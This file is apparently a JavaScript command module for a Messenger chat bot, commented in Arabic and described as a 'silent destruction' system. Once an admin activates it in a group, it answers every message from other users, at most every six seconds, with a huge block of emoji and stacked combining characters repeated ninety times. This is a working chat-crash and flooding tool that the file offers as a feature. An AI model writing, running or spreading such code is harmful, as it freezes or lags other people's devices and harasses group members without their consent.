const fs = require("fs-extra");
const path = require("path");

if (!global.zypherSniper) global.zypherSniper = {};

module.exports = {
  config: {
    name: "زيفࢪ",
    aliases: ["زيفࢪ_ايقاف"],
    version: "5.5.0",
    author: "Hanji",
    role: 2,
    shortDescription: "نظام زيفࢪ للدمار الصامت",
    category: "SYSTEM",
    guide: { en: ".زيفࢪ | .زيفࢪ_ايقاف" }
  },

  onStart: async function ({ api, event }) {
    const { threadID, senderID, body } = event;
    const adminBot = global.GoatBot?.config?.adminBot || [];
    
    // فحص المطور (صامت)
    if (!adminBot.includes(senderID.toString())) return;

    // التحقق من الملف فـ الكاش
    const cachePath = path.join(__dirname, "cache", "payload.txt");
    if (!fs.existsSync(cachePath)) {
        const payloadContent = "​🏴‍☠️🥷🏾👨‍👩‍👧‍👦҉͏҈͎̺̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻".repeat(90);
        fs.writeFileSync(cachePath, payloadContent);
    }

    // منطق التفعيل والإيقاف
    if (body.includes("ايقاف")) {
        delete global.zypherSniper[threadID];
    } else {
        global.zypherSniper[threadID] = { active: true, lastSent: 0 };
    }
  },

  onChat: async function ({ api, event }) {
    const { threadID, senderID } = event;
    const botID = api.getCurrentUserID();

    if (senderID == botID) return;

    if (global.zypherSniper[threadID] && global.zypherSniper[threadID].active) {
        const now = Date.now();
        const cooldown = 6000; 
        const lastSent = global.zypherSniper[threadID].lastSent;

        if (now - lastSent < cooldown) return;

        try {
            const cachePath = path.join(__dirname, "cache", "payload.txt");
            if (fs.existsSync(cachePath)) {
                global.zypherSniper[threadID].lastSent = now;
                const payload = fs.readFileSync(cachePath, "utf-8");
                
                // إرسال عادي باش نتفاداو Error تع notificationType
                return api.sendMessage(payload, threadID);
            }
        } catch (e) {}
    }
  }
};
